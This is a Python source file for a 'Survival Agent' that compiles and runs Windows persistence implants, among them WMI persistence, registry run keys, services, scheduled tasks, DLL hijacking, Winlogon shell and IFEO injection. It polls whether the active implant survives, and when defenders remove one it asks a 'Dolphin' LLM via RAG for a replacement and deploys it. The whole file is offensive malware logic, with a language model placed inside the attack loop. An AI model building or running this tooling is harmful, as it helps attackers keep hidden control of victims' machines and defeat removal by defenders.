import time
import subprocess
import os
import datetime
import json

# Import your custom RAG modules
from strategy_generator import get_survival_strategy
from brain_executor import ask_dolphin_for_strategy

# --- GLOBAL STATE ---
ACTIVE_TECHNIQUE = "admin_wmi_persistence.cpp" # Starting technique
BLACKLIST = []

def log_event(message):
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    log_path = os.path.join(base_dir, "survival_log.txt")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_path, "a") as f:
        f.write(f"[{timestamp}] {message}\n")

def compile_and_run(cpp_filename):
    """
    Requirement C: Dynamic Executor.
    Compiles the chosen C++ file and executes it.
    """
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    source_path = os.path.join(base_dir, "knowledge_library", cpp_filename)
    output_exe = os.path.join(base_dir, "knowledge_library", cpp_filename.replace(".cpp", ".exe"))
    
    print(f"[*] Compiling {cpp_filename}...")
    # Using the compiler command you verified earlier
    compile_cmd = [
        "x86_64-w64-mingw32-g++", source_path, "-o", output_exe,
        "-ltaskschd", "-lole32", "-loleaut32", "-luuid", "-lwbemuuid", "-ladvapi32", "-lshell32"
    ]
    
    try:
        # Compile
        result = subprocess.run(compile_cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] Compilation successful. Executing {output_exe}...")
            # Run the newly created persistence
            subprocess.Popen([output_exe], shell=True)
            return True
        else:
            print(f"[-] Compilation failed: {result.stderr}")
            return False
    except Exception as e:
        print(f"[-] Execution error: {e}")
        return False

def check_health(technique_file):
    """
    Maps the filename back to your existing monitor logic.
    """
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    
    # Map filenames to your existing logic
    mapping = {
        "registry_run_key.cpp": "registry_run_key",
        "admin_service_persistence.cpp": "admin_service_persistence",
        "windows_service_creation.cpp": "admin_service_persistence",
        "admin_wmi_persistence.cpp": "admin_wmi_persistence",
        "scheduled_task.cpp": "scheduled_task",
        "dll_hijack_iexplore.cpp": "dll_hijack_iexplore",
        "winlogon_shell.cpp": "winlogon_shell",
        "ifeo_injector.cpp": "ifeo_injector"
    }
    
    # Fallback to the base filename without extension if not in mapping
    tech_key = mapping.get(technique_file, technique_file.replace('.cpp', ''))
    
    try:
        # Reusing your existing monitor infrastructure
        monitor_script = os.path.join(base_dir, "sentinel_monitors", f"check_{tech_key}.py")
        if not os.path.exists(monitor_script):
            print(f"[-] Monitor script not found: {monitor_script}")
            return False
            
        proc = subprocess.run(["python", monitor_script], capture_output=True)
        return proc.returncode == 0
    except Exception as e:
        print(f"[-] Health check error: {e}")
        return False

def main_loop():
    global ACTIVE_TECHNIQUE
    print(f"[*] Survival Agent Active. Current Technique: {ACTIVE_TECHNIQUE}")
    
    # Initial Deployment
    compile_and_run(ACTIVE_TECHNIQUE)
    
    while True:
        is_healthy = check_health(ACTIVE_TECHNIQUE)
        
        if not is_healthy:
            print(f"[!] FAILURE DETECTED: {ACTIVE_TECHNIQUE} has been removed.")
            log_event(f"CRITICAL: {ACTIVE_TECHNIQUE} failed.")
            
            # 1. Add failed technique to Blacklist (Requirement D)
            BLACKLIST.append(ACTIVE_TECHNIQUE)
            
            # 2. RAG Phase: Generate the JSON prompt
            print("[*] Accessing Knowledge Library via RAG...")
            json_prompt = get_survival_strategy(ACTIVE_TECHNIQUE, BLACKLIST)
            
            
            # 3. Brain Phase: Consult Dolphin
            print("[*] Consulting the Dolphin LLM for a survival strategy...")
            new_technique = ask_dolphin_for_strategy(json_prompt)
            
            if new_technique:
                # 4. Deployment Phase: Compile and Run (Requirement C)
                print("[*] Deploying new technique...")
                success = compile_and_run(new_technique)
                if success:
                    ACTIVE_TECHNIQUE = new_technique
                    log_event(f"RECOVERY SUCCESS: Transitioned to {ACTIVE_TECHNIQUE}")
            else:
                print("[-] LLM failed to provide a valid strategy. Retrying in next cycle...")
        
        else:
            print(f"[+] {datetime.datetime.now().strftime('%H:%M:%S')} - {ACTIVE_TECHNIQUE} Health: OK")
        
        time.sleep(30)

if __name__ == "__main__":
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[*] Exiting Survival Agent. Goodbye!")